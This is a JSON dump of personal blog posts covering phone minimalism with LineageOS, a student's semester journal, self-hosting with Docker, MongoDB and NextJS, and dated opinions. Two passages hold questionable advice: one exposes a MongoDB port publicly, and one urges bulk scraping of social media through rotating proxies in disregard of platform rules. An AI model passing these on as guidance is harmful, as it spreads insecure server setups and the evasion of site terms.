smartphone time to literally 10 minutes every day (only scanning the code when entering a library and around 5 minutes checking my friends' status on Weixin), although once or twice a week I would bypass that, but no more than 1 hour.\n\nAfter I entered university, I decided it was too distracting, and I didn't use my phone for a whole semester. It was kind of amazing to believe in retrospect, but I really didn't use it for an entire three months at all. I bore the inconvenience and utilized my computer to do all sorts of stuff. The second semester I continued my stance against using smartphones, and couldn't hold on after the COVID pandemic hit. To be honest, if it wasn't for COVID, I would probably keep on not using a smartphone, only there was mandatory testing to be done every day, which is awfully annoying.\n\nPeople would usually be confused by my statement of not using smartphones, and few would think from my perspective. I can confidently say that not having a smartphone nowadays is just unbearable in China; if you have no WeChat, you can do practically nothing and are no different than a dying old person in terms of living conveniences.\n\nI did that experiment myself and failed. During that time, I remembered the maps and bus routes by heart and went out riding my bicycle (which I later lost). After losing my bicycle, I walked a lot. I watched many movies and YouTube on my computer; indeed, YouTube was one of my main forms of entertainment at that time. I also read a lot, and that was the last period where I remembered myself actually enjoying literature. I can no longer dive into literature. I relied on my parents for much information and kept a daily track of everything to do, every single day. I frequently climbed to the top of the school building to watch the city lights at night. I believed in all sorts of good things. Sometimes, I kind of longed for that kind of mentality at the time. It was actually very sad and had a reverse effect on me.\n\nAlso, there was one occasion when my Android phone started beeping for no reason, and then it stopped.\n\n## Downsides of LineageOS and Other Distros?\n\nSo LineageOS doesn't have a package manager, which I think is definitely not ideal. But I can use my computer for 90% of tasks.\n\nThe other OS that I'm interested in is PostMarket OS (or mobile Alpine). However, it doesn't seem to support WeChat. That's frustrating for me because the main reason I use my smartphone is for WeChat. So if someday, say, I leave Mainland China, then I will probably ditch WeChat and start using that distro.\n\nThere is also GrapheneOS, which mainly supports Google Pixel. PinePhone has low specs, and I have had great trouble using it.\n\n## Removing System Apps from LineageOS\n\n```bash\nadb shell pm uninstall -k --user 0 org.lineageos.eleven\nadb shell pm uninstall -k --user 0 org.lineageos.jelly\nadb shell pm uninstall -k --user 0 org.lineageos.etar\nadb shell pm uninstall -k --user 0 org.lineageos.audiofx\nadb shell pm uninstall -k --user 0 org.lineageos.recorder\nadb shell pm uninstall -k --user 0 com.android.calculator2\nadb shell pm uninstall -k --user 0 com.android.fmradio\nadb shell pm uninstall -k --user 0 com.android.stk\n```\n\n## Setting Up LineageOS\n\nOther than that, it's just a few clicks away with adb install for all essential software, and I set up my phone pretty quickly. I'm not against WeChat, but if there's any chance, just any chance, I would probably ditch it.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea6"}, "title": "Start of a New Semester in USTC", "date": {"$date": "2024-03-04T08:15:00Z"}, "type": "journal", "access": 1, "body": "So I am back in USTC for a new semester.\n\n## Meaningful Things to Do\n\nSo I tried thinking about meaningful things to do. I mean, for a thing\nto be meaningful, it better be cumulative. For example, gaming isn't\nmeaningful because gaming today doesn't make your next day better at\nall, and the skill of a human being in gaming is limited, meaning AI is\nfar superior.\n\nOther things are debatable, in my opinion. For example, it is debatable\nwhether learning extensively about a new subject (like pursuing a PhD)\nis meaningful or not. For one, it is cumulative and after studying that\ndeeply enriches your knowledge of that field. However, on the other\nhand, maybe like the new knowledge studied, if not applied to a job,\nisn't even worth the pain of studying them. If you are an expert in some\nnot so popular fields, there might be no opportunities for showing off\neven, and the goal at the end isn't meaningful.\n\nI do think language learning is a meaningful thing, though. So like\nimagine if I don't know English, that would be devastating. Or if I\ndon't know Chinese, ahh, I would probably lose first-hand engagement in\nthe culture and couldn't even communicate with people around me.\nLanguage is pretty much base to all the things in my life, and it is\nlargely underestimated in terms of importance. But learning a third\nlanguage is not as significant as the first two, one of which is my\nmother tongue, the other being the de facto language in the world.\nStill, even if it is not as significant, it's still a reasonably\nfulfilling thing to do. Mainly I want to learn languages like Japanese,\nRussian, French, German, etc. But like learning 4 or 5 languages is\nclose to impossible with a regular schedule or hard schoolwork or\ndemanding job. Maybe like learning only one more language is quite\nsatisfying for me.\n\nOther meaningful things include sports and musical instruments, but they\nare not as important as learning a language, in my opinion.\n\n\nThe main thing isn't about the earnings, it's like currently I am still\nusing my parent's money, meaning that they constantly try to monitor and\ncensor my activities, which is really annoying. I mean I can't really\ncomplain too much since it's their money, but they are seriously\nannoying to me. I hope for the day that I can become self-sufficient to\ncome sooner. If I am self-sufficient probably I won't need my parents\nanymore. However, logically speaking I shall still pay back in return to\nmy parents, since they brought me up, but this is probably something I\nshall do like after the age of 35 or 40 years old, when my parents got\nvery old, to care for them or hire an aunt to care for them or whatever.\n\nThe fact that I am not self-sufficient is deeply troubling, and maybe,\nlike after I go to grad school, hopefully as there are salaries or\nwhatever.\n\nIt's not like my parents don't have much money, in fact, they are pretty\nwell-off among their peers and in Shanghai, having 2 apartments in\nZhangjiang High-tech Park, each one worth millions of dollars. But\nreliance brings unfreedom.\n\n## Thinking about my Dropping Out\n\nSo if I drop school right now, and go off freelancing here in Hefei,\nworking 1 day a week, hopefully self-sufficient with my MERN stack\nskills. I have six days off, which is practically all the time. In fact,\nif I go freelancing it doesn't matter where I work, and Shanghai\ndefinitely isn't a good choice because of its relatively high living\nstandards in China. Maybe some smaller cities will do. Hefei is not a\nbad choice anyways, living here on 5000 RMB a month is more than enough.\n\nI don't really worry about stability, since I think I can code\nfull-stack for at least 30 years. I mean, I am willing to learn and\nwork, and I don't demand lots of money.\n\nMoreover, I can stay home all the time, and I can go isolated. I mean, I\ncan still go out and play if I want, only it's not necessary, which is\nawesome. I can still go out a few times a year, and probably at dawn,\nwhere there are no people outside.\n\nI also have the whole day off to me, and I can start learning new\nlanguages 24/7. I can probably pick up one language every half year. So\nif I work like this, then I will probably be equipped with 6 more of the\nworld's most popular languages in like 3 years, which is so intriguing.\nI am mainly interested in studying languages of developed regions like\nEurope and Japan, or special countries like Russia, and not that much of\nAfrica or Southern Asia.\n\nThat does sound interesting and alluring but of course, I won't do that,\nsince that is far beyond the social norm, and I haven't had such\npersonal decision experiences. Maybe like when I am 35 or 40 years old I\ncan have more freedom in personal decisions. It is too risky, like\ndropping out of school. I still need my college degree, else since I\ndon't have a high school diploma, I will probably be a middle school\ngrad, lol.\n\nAnyways, literally speaking, my parents don't know what is best for me.\nThey are very misleading in terms of judgment, and often control my mind\nto do things. I don't blame them though. My parents are awesome people,\nand worked extremely hard to gain a social status like this through the\npoverty years 30 years ago in China, climbing up the social ladder from\na poor worker's family in remote rural towns, to having 2 apartments in\nthe tech hub of Shanghai. They are definitely more impressive than I\never could be. For me to match their achievements I probably have to be\na billionaire in Silicon Valley.\n\nI walked back to USTC. It seemed awfully weird here, with so many\nstudents around, that I felt a sense of nervousness even. I feared\nschool, and I feared socializing. My parents also say I am quite\narrogant in the eyes of other people. No.\u00a0This is wrong. There is no changing that. I want to show my personality and uniqueness in socializing, right? I\nwant to show the true self instead of pretending to be someone whom I\nhate, right?\n\nI mean, I felt like I don't want to be demanded to do something. I have\nthe right and I don't owe any people, well, maybe except for my parents,\nsince they brought me up for the first 18 years. Thinking about\nparenting, it is extremely time and energy-consuming, which is part of\nthe reason my mom worked a light job. Just in terms of money spending\nand emotional support, that is more than a full-time job. I remembered\ncountless times when my mom was tired yet still tries to think about me\nfirst, and try to make me happy and well cared for. I remembered my mom\ntrying to find resources for me in every part of my academic journey,\nand that was really touching. However, I am a legal adult now, and I\nknow better for myself. It is maybe not the best for me, but I need to\nmake my own decisions. Also, I don't owe any unknown people anything. My\nparents always say I need friends, and I shall treat strangers with\nenthusiasm and contact them to make friends. However, I definitely\ndisagree. I treat strangers with respect, and other than that I treat\nthem the way I want. I decide who to contact and which person to. It is\nmy right to decide I want isolation, or my right to decide to be in a\ncrowd, long as it doesn't affect other people negatively. It is my right\nto stay up all night and sleep all day, although putting my own health\nat risk, but I assume that it is my own decision, right?\n\nI was, and still am, an extremely cautious person. Well, maybe not as\ncautious as some Chinese students around me, but still, I am easily\nbrainwashed with fear and hatred about something. When my parents taught\nme fire and knife was dangerous, I refuse to use them even today,\nrelying on a kettle pot to cook noodles and rice porridge. I always\nfeared teachers, even though sometimes they know no better than me,\nespecially those in high school. However, because of the fear I didn't\nargue back one word at any teacher as long as I could remember, only\noccasionally trying to explain my own standpoint. It's the amount of\nmind control that they have on me, that I deeply want to get rid of,\neven though most times they are correct.\n\n## Motivation\n\nAs I begin this new semester I have probably the lowest motivation in\nthe history of my life. I couldn't think about a reason to push forward.\nFor example, there is this operating system and database course. I am\nalready pretty much experienced in MongoDB and Sqlite and have used\nPostgreSQL for Invidious and Peertube and MediaCMS hosting. All I want\nto do is try to read the source code and understand the main parts of\nthe database, for example, reading Sqlite or BerkeleyDB shall be\ninteresting practice for such a course. There is also tinydb and\nsmalldb, but that's not capturing the essentials of a database, not\nhaving much data structures. Anyways, I hope the teacher just walks\nthrough the main source code of a popular database, and that shall be\nsufficient for this course. As of operating systems, I would expect to\ndevelop all kinds of interesting programs on ArchLinux. It's just I am\nreally interested in this subject itself, but the course makes it\nextremely boring for me. Finishing studying this course doesn't enhance\nmy skills anyways, only preparing for a crappy test. I don't think\nstudying such stuff is more meaningful than gaming.\n\nAlso along came procrastination, as anything I saw seemed to me more\ninteresting than studying and academics, particularly social media.\nSometimes I would want to be popular on social media, yet still\nrejecting the idea since social media is proprietary and censored by the\ngovernment, and not DIY. My own instance gets no attention among people,\nthough. But I was just far more curious about society, and particularly\nthe trends of things that are not obvious, and thoughts not written, and\nthings not seen from the surface. Social medias give me far more stamina\nthan raw studying.\n\nI stayed at home for a whole week, trying to evade everything. This is\nthe longest time I stayed at home as long as I could remember, the last\ntime being the covid quarantine, 7.14 to 7.21. I didn't remember staying\nat home for one day since 2019 to mid-2023, other than that quarantine.\nEven during covid, I would go restless at home and try every means to go\nout and run and breathe fresh air. I just, well, changed. Before that\none whole week at home, I went out like only once every 3 days or so,\nmostly late at night for walking and stretching my legs, and shopping\nthe necessary things and cleaning the trash. I don't want to face\nanything, and wanted to go alone for peace and quietness. I actually\nquite enjoy being immersed in my own digital world, and hope to do this\nforever.\n\nPeople say evading and shying off from real life is a bad idea, yet it\nhelps. Evading makes my emotions more controllable and myself feel more\ncomfortable. Facing everything directly is a bad idea because it just\nmakes things worse and unbearable. Anyway, this is supposed to be my own\nchoice, the same as procrastinating. If I want to do so, nobody has the\nright to tell me not.\n\nI tried running and it turned out I had been much slower than I\npreviously was just half a year ago. I could go sub 4:00 for several\nkilometers without being too tired, but now I ran like 300 yards and was\nout of breath, probably as a result of staying home too long. Anyways,\nstaying at home is also my own choice, and it is not anyone else's duty\nto command me to go out. I decided running makes the person look older\nand uglier these last few months, and it is still a topic I am debating\nwhether or not to do.\n\n## Showing Off\n\nThen there is the strange desire to show off. I mean it is downright\nstupid to do so. Showing off brings nothing but a sense of fake pride,\nand perhaps some dopamine. I wanted to use every means to show how\ntechnically advanced I am, only trying to make a big fool out of myself.\n\nI really don't understand the desire to show off, but I remembered this\nas a need for several years. I wanted people to notice me, even as an\nanonymous person on social media, to acknowledge my skills and\nwhatsoever. It is weird, perhaps because I am facing such a difficult\ntime at school, and losing all my confidence academically that I want to\ntry to get my skills verified for another way. It is still so stupid, I\nmean, showing off doesn't increase my skills, it only makes me a clown.\n\n## Looking Forward\n\nAnyways, time shall pass, and I did grow a lot mentally these past few\nmonths. Sometimes time is magical and changes everything, so it's best\nto keep on and try to figure out what to do for the day."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea7"}, "title": "Self Hosting Thoughts", "date": {"$date": "2024-03-03T08:02:00Z"}, "type": "web-dev", "access": 1, "body": "Recently, the idea of self-hosting fascinates me. This is because I find\nI can self-host pretty much all websites easily, including forums, video\nplatforms, blogs. The only thing is the cost, which, actually isn't that\nmuch if hosting small instances.\n\nFor example, purchasing 1 TB of object storage is only 15 dollars one\nmonth on Cloudflare R2. Akamai Linode offers this at 20 dollars a month\nfor 1 TB object storage. AWS offers similar pricing around 10 dollars to\n20 dollars (it has so many S3 models). Notably, Dropbox even has a\ncheaper price of \\$9.99 a month for 2 TB. There are also cheaper object\nstorages out there, except their performance and stability are not\nknown. But Dropbox is proprietary, and I have no idea what's going on,\nand Dropbox points my files to other files in the cloud with the same\nHash values, and Dropbox GUI can sometimes be non responsive, which is\nannoying. \n\nWhen I was a child, I didn't really know and think about such things,\nwith evil Windows OS making everything foreign and mysterious for me. I\ndidn't know what was going on in those websites, and that made me\nsuccumb to them. But over-relying is not a good practice, and I shall\nlearn to be independent and strong. That is what I dislike about Chinese\ntech companies, and also some Google and Microsoft services. They do\ncreate awesome available services, only for the individual to be used at\nthe cost of losing one's own mind and freedom in the digital Internet.\n\nBut self-hosting has a main challenge, which is probably people won't\nnotice the website. I don't know why, but people seem awfully glued to\npopular platforms like Twitter, Instagram, and Bilibili and WeChat in\nChina. The sort of over-reliance on manipulating, proprietary, and buggy\napps makes me feel uncomfortable. It is this discomfort that drives the\nurge to go self-host, yet it is also this situation that an awesome app\nwill probably be ignored before it's dead. My website has few unique\nvisitors and few comments so far. I don't know why people are so\nreluctant to leave comments anonymously, though. Perhaps it's because\nthe total visitor is too small.\n\nIt runs in the human mind---that they want to stick to one thing, the\nthing they are familiar with, all their lives, especially Chinese\npeople. Many people choose inconvenient and trash platforms themselves,\nwhile complaining about it constantly without the urge to switch. The\nnumber of people doing this is too large, in fact, I find this behavior\nquite hard to comprehend. It is like having luxurious goods, and a\nlow-end bed, and always complaining how bad the bed is while not willing\nto change. There are better platforms out there, and anyone nowadays can\nhost one by buying cheap cloud storage. I think like Linode Nanode 5\ndollars a month is pretty much enough to host a small forum for\ndiscussion or something related. Don't say how much expertise it takes\nbecause, as a bottom student in the department of computer science, I am\npicking it up from raw only after less than half a year. Hosting a forum\nlike Discourse shouldn't be that hard. The main thing here is\ncustomization, and by customizing everything to suit my own needs, it is\ndefinitely better than the proprietary and fixed, not flexible\nplatforms.\n\nAlso I am hosting platforms primarily for my personal utility like FreshRSS or Task Manager or Metabase, not for other people to look or join.\n\n## Invidious/Piped\n\nThere are loads of instances out there, and the one I use most\nfrequently is yewtu.be. Invidious doesn't store videos on its own\nservers; it traffics the YouTube videos. But Invidious don't always work, which, of course, is attributed to YouTube's desire for monopoly.\n\n## Forums\n\nSimply using the MERN stack to write a forum won't take that long, at\nmost in 1 week. There are also mature hosting services like Discourse\nforums. Anyways, they have their pros and cons. Writing one myself is\nbetter tailored to my preferences, while using the pre-built apps is\neasier and saves less hassle.\n\nAlso, there is Mastodon, which is like a Twitter alternative. Nitter\nstopped functioning, so that probably died. But there are lots of other\nsmall forums good for a niche community.\n\n## Video-Hosting\n\nThere are lots of video hosting platforms out there, thousands of\nmillions, judging by the large amounts of adult websites. Using Peertube\nor MediaCMS or YouPHPTube are some mature hosting platforms, but they\nrequire login to post videos by default. Anyways, raw coding is quite\neasy with the MERN stack and object storage.\n\n## Security\n\nMainly when hosting, I would want to maintain the confidentiality and\nintegrity of the user's data. But if it is like a public platform, this\nisn't really that important since anyone can access the information\n\nThese days I got obsessed with NextJS and Cloud Hosting. I spent tens of endless nights hooking up in cloud servers.\n\n## Hosting MongoDB\n\nMongoDB Atlas is easy to use, however, self hosting one is far easier to manage and control.\n\n1. Hook up a ec2 instance, expose port 27017(or whatever, I am not using reverse proxy)\n2. Install the MongoDB Docker Image, configure admin password\n3. Start Docker Image\n\nThen access it with `:27017/test?authSource=admin`\n\n## Buiding with NextJS\n\nI built a task manager and a note taker with NextJS really quickly, so like basically with a MongoDB instance I can utilize with minimal frontend with Tailwind CSS. Tailwind is so cool and so easy to use like you literally don't have to learn css but only with html to build it and like tilt the frontend to be nice looking.\n\nSo like task manager is fairly easy to build, just specify add/delete/list tasks for each specific day, and the backend is quickly finished.\n\nUnlike the Mern Stack, NextJS allows you faster developement by like building the frontend and backend together because they run on the same port and like with the api router easily build both fairly quickly.\n\nThen I build a Web Markdown Note taking app with password protection and pdf conversion, without having the cookie as a auth you can only like use it as a markdown parser, but that is good enough though. Like it would be a better way to manage my blogs in the future I think.\n\n## PWA and Tauri\n\nPWA and Tauri makes app cross platform and native on Android and Linux, (and Mac and Windows). I don't have to learn Kotlin to develop on Android, and it's so clean and neat.\n\nAlso there is tauri, a lightweight cross platform wrapper for Javascript(or Typescript) apps. Its backend is Rust but using it as a wrapper you don't really need Rust. Anyway, I don't really need a web app that much on my computer.\n\n## What Apps Ain't Suitable for Self Building?\n\nA video app isn't suitable for self buildling because of its unnecessary complexities and times for polishing. I mean, it's nothing hard, but certainly a pain in the ass to get around every bit of it. I tried like 3 times, spend in hundred of hours in building my own video platform but eventually give up.\n\nJust something like creating a thumbnail and preview video seems immense and extremely buggy. You can run it on your own program, use another docker container to do it, or, use a Lambda function. But downloading all those different formats and then making sure nothing goes wrong takes a million years.(because things always goes wrong)\n\nAlso I don't want to hoard from other platforms(which is again, legal gray), so I wanted to merge them, like the legal way of embedding those embedded html iframes in my platform(which is an immense task too to get the iframes right and sanitize the input and make sure the image and previewvideo is working). It is so complicated.\n\nLike, projects benefit form a large groups of active developers, or else they easily become outdated and have all those errors. A lot of programs and web apps become quickly outdated, and I think like after 10 years all of my current apps will get outdated.\n\nIt is just not necessary and a huge trouble to build a polished video app(and keep polishing it throughout the years).\n\n## Portainer: Managing Containers\n\nSo like I quickly hooked up 20 apps on a ec2, and some of them are my own, and a web interface, in this case, greatly helped me mitigate the complexities.\n\n## Debugging: Log Analysis\n\nSometimes dockers run into trouble, so basically either it's environment variables that's not correctly configured or like some internal problems. No worries just go run interactively and view its logs and the problem will be solved(if it is solvable). Frequently it's just environment variables won't accept some values.\n\n## Reverse Proxy\n\nI personally preferring configuring Nginx myself so I usually run docker with external ports and then map those ports to websites. The Nginx configuration files might also be causing some troubles as some point. \n\n## Auto Build\n\nI build all images on my own with Dockerfiles, in the future I can benefit from Github Actions to auto build these Docker Images.\n\n## API vs Web Interface\n\nI found myself appreciating APi much more than the actual web interface. I mean, using an API provides minimal distraction and are generally more efficient, like you can tune it for your specific needs(like the different endpoints).\n\nAlso I found myself not willing to pay for services(like I am stopping paying ChatGPT), but more like paying and using the API service. The ChatGPT web interface frequently freeze and goes into bugs.\n\n## Security\n\nBasically expose only the 443 and 80 port and the ssh port (I also exposed port 27017). Exporting too many port is generally fine too but like that's not the default on AWS so I guess I should follow the default.\n\nIf you expose the MongoDB port with weak password you will get hacked. If you expose the root login and change root password to a weak password like \"password\" for personal use you will get hacked. I have been hacked both times. In a dev environment my MongoDB filled with \"send bitcoins to ...\". In another occasion, Linode started warning me and sending me reports of phishing attacks on my web server, which was a result of my changing the root password to an easy password for personal use. My web server was reported by 5 anti spam a day and I eventually shut the instance down. Just disable password login and use the web interface. Also, Linode's Lish interface is unpolished and buggy, frequently not being to get the job done. AWS cloud shell is better.\n\nAlso, sometimes there are connection problems(probably become I come from VPN endnodes), but the cloud shell is very good and easy to use. The ssh are sometimes laggy, and I never use them now.(sometimes the ssh aren't laggy, I remember like one day in school the ssh was good, but when I came home with the broadband the ssh becomes slow)\n\n## Backups and Data Hoarding\n\nIt is important we gain control of our data\n\n1. I need to restore my data if my server suddenly burns(or if the service dies) in a human readable(or reasily recoverable way)\n2. The data needs to scale. I have 1 MB data in this app today, I might have 10 MB, I might have storage of 100 GB, I need to efficiently scale when my data grows(which is why I would want S3-like for object storage on the cloud for media)\n3. Easily Manageable (like syncing, reading, whatever). I don't want a database where it is only manageable through the interface (especially a crappy ugly interface)\n\nWhile data privacy isn't always the top concern(some of my data are just public), I think it's good to follow general best practices(like blocking public access on S3 buckets for archiving), and that would be generally fine.\n\n## What's Next?\n\nWhile cloud hosting is fine, it isn't advised to become addicted to this field, as there are more important stuff to do like AI, and I am currently just too freaking addicted. Like, I spent an entire week staying up till morning every single day hooking up with servers, and it's too much.\n\nSo I would still be maintaining my docker servers, but more like maintaining with low efforts and utilizing my time for more important stuff. I would be willing to host interesting and popular services and would be less willing to host buggy stuff\n\n\n## Few Activities\n\nSo I think the main problem here, inarguably, is that after building a platform there aren't any people. My video platform tubeapp.org only has me in it. Even if you got people signing up, chances are they aren't going to stay long.\n\nUnlike popular platforms like YouTube, Bilibili, and Instagram, where many people visit on a daily basis, it's extremely hard to attract a reasonable amount of regular visitors (unless you host a copyright adult video website for free, like \"noodlemagazine\" or \"videosection,\" which is obviously against my morals). People just don't visit your website.\n\n## So Why Not Go Back to Popular Platforms?\n\nThere are multiple reasons, and I thought I already stated them clearly, but just to clarify once again:\n\n### Lack of customization\n\nI don't get to customize the homepage with HTML and CSS! Someone designed the ugly crap! I don't get to customize my contents! I have to follow its term of service, which makes me very uncomfortable.\n\n### Proprietary\n\nI don't have any idea what's going on in the backend! I run into an error in the platform, then there is no solution at all, which makes me panic! Imagine having a bug and not being able to debug it, and the only way is to beg a proprietary company's programmers to solve it for you! If it's open source, there would be open APIs and customizable client sides for users.\n\nThere isn't an API to upload stuff (or upload stuff from MongoDB or whatever, for that matter). I must crawl my way through a proprietary buggy web interface daily only to upload and engage in discussions, ahh, so hard.\n\nThere are lots of bugs (don't say there aren't bugs!) For example, Bilibili's uploading speed is capped, and the file for subtitles is buggy, etc.\n\n### Vulgar eye-catching stuff\n\nThere are many of those tech channels with a million subscribers that are not technical and even \"misleading\" at times (or most of the time very misleading), and the fact is that they get lots of views!\n\nPopular channels on YouTube include \"NetworkChuck\" and \"LinusTechTips\" (actually some folk with the same last name), and they offer no depth in terms of knowledge, only eye-catching simple stuff. I used to be interested in them one year ago, no more now, they are simply too shallow.\n\nThese people probably earn lots of money and are doing it full time. Many comments down there are, in fact, even more misleading. (and that is on YouTube, not on Chinese platforms where almost nobody understands tech) For example, they compare distros based on desktop environments (I mean, what the heck?? You can literally customize the desktop environment to be anything you want!)\n\n### Few views/comments as well\n\nYeah, like I once opened a Bilibili account and posted programming content to it, tends to get around 50 views with no comments at all, which is sad.\n\n### Privacy Concerns\n\nAs we all know, privacy is a huge concern, especially for these video platforms. You use a phone number to register, and those Chinese platforms practically know who you are. They aren't E2E encrypted, and everything is public in China. So every word you say links to you, the real person, on Chinese platforms (it's not necessarily always that bad, just a reminder not to say anything improper, or Winnie would jail you!).\n\n### No Rights for Users\n\nSome platforms have absolutely no rights for unsigned-in users, like Twitter, Instagram, or Bilibili. Without an account, you can't view or see other people's posts. They even restrict those privacy frontends like Invidious and Nitter (dead) and Bibliogram (also dead).\n\n### Requires \"Clever\" Javascript Tricks\n\nSome platforms have those strange frontend tricks that allow you to do certain stuff (but not all), without logging in or something. Like switching to mobile sites on browser console or copying the address then visiting. Or freaking Apple phone playing video without full screen: by clicking the pop-out then when it pops out click the pop in again, then you can watch videos in freaking crap safari without having to go full screen. These clever tricks, although easy to learn, are dangerous to rely on because they are very misleading.\n\n### Poor Performance\n\nDon't use the argument \"It is a global and popular video platform, so it must have good performances.\" Wrong!\n\n![YouTube Lighthouse](https://cdn.jimchen.me/Screenshot%20from%202024-04-03%2001-25-31.png)\n\n![Bilibili Lighthouse](https://cdn.jimchen.me/Screenshot%20from%202024-04-03%2001-29-37.png)\n![Instagram Lighthouse](https://cdn.jimchen.me/Screenshot%20from%202024-04-03%2001-35-23.png)\n\nYouTube got a lighthouse performance score of 26 on its frontpage, even when lighthouse is designed by Google. Maybe it should stop loading these bloats are trackers and hype videos though?\n\nMaybe a person doesn't want 3rd party plugins or those cookie sessions, and wants a faster load. The point is these platforms treat users like dumb idiots without giving them options. It has great power over its users, powers that it shouldn't have in the first place.\n\nMy Vanilla implemented video platform (without preview image cap and CDN or addressing any SQL/caching issues) has a performance score of 91.\n\n![My Platform Lighthouse](https://cdn.jimchen.me/Screenshot%20from%202024-04-03%2001-42-19.png)\n\n### Brain-Poisoning\n\nSocial media can be largely filled with spam and propaganda, with a recommendation system that constantly feeds you with the \"hype\" videos that ain't gonna make you better in computer science.\n\n## Conclusion of Popular Platforms\n\nSo like, there are lots of users there, so occasionally going there for looking at user's comments is ok. Sometimes I am not looking for the video itself but looking for the comments on the video to get a general idea, or just for fun.\n\nCompared with only one YouTube, there are thousands of instances of Peertube (that is public), and Mastodon instances.\n\nSo yeah, we won't talk about it anymore, and I don't compromise with current popular social media. If I don't have views, fine, but it's better than having no power.\n\n## Cloudflare\n\nWhen uploading a video to Cloudflare S3, it takes a while for the video to load smoothly. When I first upload to it, I couldn't fully utilize the Internet connection speed in Hong Kong, but the speed is good enough in the UK. It takes like half a day before I could watch the video easily from everywhere in the world.\n\n## Lower Costs?\n\nSo Akamai is actually not a cheap company (although it isn't expensive either). I found there is this cheap VPS hosting called Hetzner, which builds its own servers. It offers 3 AMD CPU, 4GB RAM, 80GB disk space at 8 USD/month, which is super cheap. It is like about one half the price of Linode. But I've used Linode for a long time and it works fine though.\n\nSo by optimization, I can achieve the same performance with costs cut in half, but I am content with these platforms at the moment, I am also kind of lazy, and I don't want to switch.\n\nThe German company Hetzner is super cheap, about half the price of Linode, offering 40 GB disk and 4 GB ram at 4 dollars a month. It's also been around for a long time, since 1997. But Hetzner mainly operates in Europe, and I really like Linode. There is no reason for me to migrate anyway. I thought like migrating would save me about 20 dollars a month, but then again like everything is so costly. Subscribing to Poe or GPT for a month is 20 dollars, and eating a dinner is sometimes 20 dollars. It is just not worthy to save every penny.\n\n## Lack of Utilization\n\nI put the background worker on a separate Linode with 8 GB ram, but it relaxes 90% of the time(since my website doesn't have many videos, and it's only me right now), so it is not utilizing enough of the machine. But it can't run smoothly on lower ends Linodes though. I guess that I just have to leave it be like this. Speaking of costs if I store like 5 TB object storage that will cost about 100 dollars in popular platforms like AWS or Google Cloud, so like this isn't very significant.\n\n## Backing Up S3 Storage\n\nSuppose the cloud data center got a fire, then the data will be lost. Obviously the chances is very very low, but such things do occur in history. So backing it up through 2 services is a good idea. \n\nBackblaze B2 is very cheap so I back everything up from Cloudflare S3 to Backblaze B2 with boto3.\n\nSpeaking of Object Storage, there is Backblaze B2 which is super cheap, offering at 6 USD/TB. Backblaze is a company that is \"solely for storage purposes, not like AWS which uses its S3 to fund other projects\".\n\nAnd I can also buy a server at home, except that well, I don't want to manage the hardware full-time, and I pull the electricity sometimes.\n\nBlackblaze B2 is 3 times cheaper than AWS or Akamai object storage."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea8"}, "title": "Controversial Opinions 2023.12 - 2024.8", "type": "private", "access": 3, "body": "## Updates 2024.9.16 \n\nMaybe I am moving back to my markdown parser? After all, it's like this, I moved to Mastodon twice and moved back twice.\n\nWhy did I move back again? I think the primary reason is aggressive minimalism.\n\nSo like this Markdown Parser can do anything, what is the point then, of using another app?\n\nThe more app I use the messier everything gets.\n\nSo like if I use markdown parser to do anything, including tasks, posts, ... won't it be better somehow?\n\nI do like the idea of Fediverse very much, but like it's still far from mature, if it ever will. Fediverse remains a very niche community out of touch with normal people, and my own Mastodon instance is even more far out of touch from anybody.\n\nIn conclusion, what I am saying is that I won' t have any friends on Fediverse, so maybe staying here is better.\n\nI need to sort of clean up my mind. Obviously, totally cleaning everything up is infeasible. But anyways lots of things can be thrown away in this neo-minimalism fashion.\n\n## Updates 2024.8.5\n\nI am joining Fediverse and I will close this blog entry. I am migrating to Mastodon.\n\n## Updates 2024.8.1\n\nI know athletes worked all their life for the Olympics to compete in their divisions and I don't really care much about them. It's not like they care about me either. It's like nobody even gives less of a damn to me in the very least and I'm a failure compared to Olympians anyway.\n\nI watch sports for aesthetics so like I think personally only the sports that are visually appealing interest me. So I'm only interested in figure skating and rhymic gymnastics right now like I'm watching others pure as some amazement. I'm not like seriously watching the other aspect of sports. Speaking of figure skating it's actually pretty shitty how figure skating has became these two years so international figure skating is pretty much shit now, and basically the thing is we don't really care a damn about Olympics anyway\n\nIt's not like a matter of whether I will like a specific movie star or something, because there ain't a lot of movie stars that I even care about or even know about. If you list the current state-of-the-art movie stars, chances are I won't care a shit about most of them. So if one of them, like, or any of them, like, I stopped liking any of them, don't take it as a big deal, because that's simply putting them to the norm instead of an exception.\n\nFighting movies are very stupid. Literally, if people want to see some real fight, they should go for MMAs. Which is quite nasty to watch. It's not aesthetic at all. And if you don't really want to see them fight without only bodies or MMAs or perhaps they're looking for gore contents. Which is very very disturbing to watch. And I never watched much of it anyways. I don't have any interest in both of them. So it's like they're portraying violence in these fighting movies in a very childish or stupid way. So I don't really like it.\n\n\nReddit these days start banning user agents and banning robots that only allowing those that pay them, like Googlebots. But the point is, obviously I don't think this is a good idea, but I don't think it's that bad as people protested it is. So like, it's the current state of art of most Chinese medias I would say, so like, especially Tencent controlled. So there's a shitty company called Tencent that has all of these things already banned, and I'm using them perfectly fine. So yeah, social media is social media, you gotta give them like, they have control over what they can do, and it's not as bad as it is.\n\nDon't take social media seriously, they are not to be taken seriously, don't respect the social media's rules, cause they are pretty much shit. The best way to interact with social media is bulk scraping, either through API or Selenium or anything, bulk scrape its data, the best way is perhaps using a rotating proxy node with VPNs and using something like Selenium to bulk scrape the data to consume. Anyways, social media is pretty much shitty these days, so like, yeah, there's nothing I can do about it, it is what it is, and don't expect like, everybody else to follow the rules, cause, and I'm not the one making the rules anyway.\n\nI went on Chinese social media and saw some people like directing hate like you're a Japanese spy. Bro, it's so ridiculous. Like literally Chinese people are blaming others for being a Japanese spy. Another reason why I should never go on Chinese social media. It's so fucking sad. Like Japan is objectively a wealthier country than China, so you would imagine those people probably living in worse conditions than- and if you hate somebody and you call them a Japanese, it's actually a blessing. Lol.\n\n\n## Updates 2024.07.31\n\nI am not going to be Android Developer. I simply have too much more to do and it's not much new to know after Javascript. I have the best apps on Android native for me. Apple seems dystopian so I am not gonna use it. Anyways, for now everything is working fine on the phone and I have no new things to ask for anyways. \n\n## Updates 2024.07.30\n\nChromium cache is so annoying. Like they cache a website and you keep refreshing you never get the refreshed version, so like either using Guest or just removing the `~/.cache/chromium/Default/Cache`\n\n\n## Updates 2024.7.25\n\nI am moving to Mastodon\n\n## Updates 2024.7.23\n\nLiterally 